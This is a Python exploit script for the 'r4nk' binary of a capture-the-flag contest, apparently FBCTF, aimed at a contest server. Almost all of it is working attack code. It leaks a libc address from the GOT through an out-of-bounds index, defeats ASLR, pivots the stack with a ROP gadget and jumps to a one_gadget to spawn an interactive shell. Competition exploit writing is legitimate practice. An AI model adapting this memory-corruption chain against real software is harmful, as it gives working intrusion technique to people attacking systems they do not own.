#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './r4nk'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'challenges.fbctf.com', 'port':1339})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = None)
env.select()

#==========

binf = ELF(bin_file)
addr_got_main       = binf.got['__libc_start_main']
addr_buffer          = 0x602100

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_main        = libc.sep_function['__libc_start_main']
offset_libc_one_gadget  = 0x4f322

#==========

def attack(conn, **kwargs):
    r = Rank(conn)

    r.rank(0, 0x11)
    conn.sendlineafter('> ', ' '*0x8 + p64(addr_got_main))
    leak = r.show()[0]
    addr_libc_main = u(leak[3:])
    libc.address = addr_libc_main - offset_libc_main
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_one_gadget    = libc.address + offset_libc_one_gadget

    rop = ROP(binf)
    r.rank(0x13, rop.rsp.address)
    r.rank(0x14, addr_buffer + 0x20)

    conn.sendlineafter('> ', '3'.ljust(8 + 0x20) + p64(addr_libc_one_gadget))

class Rank:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def show(self):
        self.sendlineafter('> ', '1')
        return self.recvuntil('\n\n', drop=True).split('\n')

    def rank(self, idx, val):
        self.sendlineafter('> ', '2')
        self.sendlineafter('t1tl3> ', str(idx))
        self.sendlineafter('r4nk> ', str(val))

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()
    
#==========
